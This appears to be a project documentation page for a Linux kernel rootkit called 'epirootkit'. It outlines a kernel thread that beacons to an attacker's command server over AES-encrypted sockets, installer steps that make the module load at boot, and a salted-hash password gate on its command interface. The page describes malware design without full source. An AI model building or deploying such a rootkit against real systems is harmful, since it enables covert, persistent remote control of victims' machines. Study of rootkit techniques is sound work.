---
title: "Encrypted C2, Persistence & Auth"
description: "Heartbeat threads, autoload, and password protection"
icon: "router"
date: "2025-05-11T18:30:00+01:00"
lastmod: "2025-05-11T18:30:00+01:00"
draft: false
toc: true
weight: 40
---

# 1. Encrypted C2 Heartbeat

**What we did**  
Spawn a kernel thread to poll our C2 server.

**How it works**  
1. `kthread_run(c2_thread_fn, &cfg, "epic2")`.
2. Loop:
   - `msleep(ping_interval_ms)`.
   - `kernel_socket()`, `kernel_connect(attacker_ip, port)`.
   - Exchange AES-128-CBC packets using keys from `.epirootkit-config`.

---

# 2. Persistence & Autoload

**What we did**  
Automatically load on reboot.

**How it works**  
Our `installer.sh`:
1. Copies `epirootkit.ko` to `/lib/modules/$(uname -r)/extra/`.
2. Runs `depmod -a`.
3. Writes `/etc/modules-load.d/epirootkit.conf` with:
   ```
   epirootkit
   ```
    
---

# 3. Password Protection

**What we did**  
Protect `daniel.*` commands with a salted hash.

**How it works**  
1. Store `SHA256(salt‖password)` in `/etc/epirootkit/passwd`.
2. First command must be  
   ```
   daniel.p.<hex-salted-hash>
   ```
3. We compare hashes; only then unlock the command interface.
```